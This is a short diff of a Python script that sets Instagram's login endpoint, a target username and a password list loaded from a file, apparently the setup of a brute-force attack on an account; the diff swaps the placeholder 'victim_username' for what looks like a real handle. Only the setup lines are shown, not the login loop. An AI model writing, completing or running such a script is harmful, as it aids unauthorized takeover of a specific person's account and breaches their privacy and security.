@@ -4,10 +4,10 @@ import requests
 login_url = 'https://www.instagram.com/accounts/login/ajax/'
 
 # Target username
-target_username = 'victim_username'
+target_username = '__cherr__y__'
 
 # Load passwords from a file
-with open('passwords.txt', 'r') as file:
+with open('pass list.txt', 'r') as file:
     passwords = file.readlines()
 
 # Session to maintain cookies
